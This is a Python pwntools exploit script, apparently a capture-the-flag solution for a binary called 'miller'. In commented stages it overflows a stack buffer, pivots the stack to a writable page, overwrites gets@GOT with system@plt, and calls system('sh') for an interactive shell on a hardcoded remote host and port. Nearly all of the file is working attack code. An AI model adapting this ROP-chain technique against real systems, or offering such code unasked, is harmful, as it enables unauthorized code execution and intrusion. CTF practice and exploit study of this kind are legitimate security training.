#!/usr/bin/env python3
# solve.py — millers-planet solver
# GOT overwrite: gets@GOT -> system@plt, then system("sh") via gets_call gadget
# Uses "sh\0" string found in .dynstr at 0x3fe557
from pwn import *
import sys, time

context.binary = './files/miller'

e = ELF('./files/miller')

REMOTE_HOST = sys.argv[1] if len(sys.argv) >= 3 else '194.102.62.166'
REMOTE_PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 23444

# Binary addresses (no PIE, base 0x3fc000)
gets_got    = e.got['gets']       # 0x405020
system_plt  = 0x4010c0
sh_addr     = 0x3fe557            # "sh\0" in .dynstr
pivot       = 0x3fcc00            # RW page with plenty of stack
gets_call   = 0x401450            # lea rax,[rbp-0x110]; mov rdi,rax; call gets; nop; leave; ret
leave_ret   = 0x401384            # leave; ret

def exploit(p):
    p.recvuntil(b'message', timeout=15)
    p.recvline()
    p.sendline(b'50')
    p.recvuntil(b'message', timeout=10)
    p.recvline()

    # Stage 1: stack overflow -> gets(pivot=0x3fcc00) via gets_call gadget
    # gets_call: lea rax,[rbp-0x110]; mov rdi,rax; call gets; leave; ret
    # Set rbp = pivot+0x110 so gets reads into pivot
    payload1 = b'A' * 0x110
    payload1 += p64(pivot + 0x110)   # fake rbp -> rdi = pivot
    payload1 += p64(gets_call)       # gets(pivot), then leave;ret
    p.sendline(payload1)
    time.sleep(0.5)

    # Stage 2: write chain to pivot, set up for GOT overwrite + system("sh")
    # After gets(pivot), leave;ret: pop rbp=[pivot+0x110], ret=[pivot+0x118]
    #
    # Layout at pivot:
    # +0x000 to +0x10f: zeros (padding)
    # +0x110: gets_got+0x110 = 0x405130 (rbp for gets_call -> buffer at gets_got)
    # +0x118: gets_call -> gets(gets_got) [to overwrite GOT]
    # +0x120 to +0x22f: zeros
    # +0x230: sh_addr+0x110 (rbp for final system("sh") via gets_call)
    # +0x238: gets_call -> system("sh") since gets@GOT will be system@plt
    payload2 = b'\x00' * 0x110
    payload2 += p64(gets_got + 0x110)  # +0x110: rbp -> gets writes to gets_got
    payload2 += p64(gets_call)         # +0x118: gets(gets_got)
    payload2 += b'\x00' * (0x230 - len(payload2))
    payload2 += p64(sh_addr + 0x110)   # +0x230: rbp -> rdi = sh_addr for system
    payload2 += p64(gets_call)         # +0x238: system("sh")
    p.sendline(payload2)
    time.sleep(0.5)

    # Stage 3: overwrite gets@GOT with system_plt
    # gets reads into 0x405020 (gets_got).
    # After gets returns: leave;ret -> rsp=0x405130
    # pop rbp=[0x405130], ret=[0x405138]
    #
    # Layout written to GOT area (0x405020):
    # [0x405020] = system_plt (overwrites gets@GOT)
    # [0x405028..0x40512f] = zeros (corrupts malloc/fflush/scanf - fine for "sh")
    # [0x405130] = pivot+0x230 (rbp to pivot back to 0x3fc page)
    # [0x405138] = leave_ret (leave;ret -> chain to 0x3fce30 on 0x3fc page)
    #
    # After leave at 0x405138:
    #   mov rsp, rbp (= pivot+0x230 = 0x3fce30)
    #   pop rbp = [0x3fce30] = sh_addr+0x110
    #   rsp = 0x3fce38
    #   ret = [0x3fce38] = gets_call
    # At gets_call:
    #   lea rax,[rbp-0x110] = sh_addr; mov rdi,rax
    #   call gets@plt -> call [gets@GOT] = call system
    #   system("sh") -> shell!
    payload3 = p64(system_plt)
    payload3 += b'\x00' * (0x110 - 8)
    payload3 += p64(pivot + 0x230)     # rbp -> pivot to 0x3fc page
    payload3 += p64(leave_ret)         # leave;ret
    p.sendline(payload3)
    time.sleep(1)

    log.success("Exploit sent! Trying shell...")
    p.sendline(b'id')
    p.interactive()

is_local = len(sys.argv) >= 2 and sys.argv[1] == 'local'

if is_local:
    p = process(['./files/ld-linux-x86-64.so.2', './files/miller'])
    exploit(p)
else:
    p = remote(REMOTE_HOST, REMOTE_PORT)
    exploit(p)
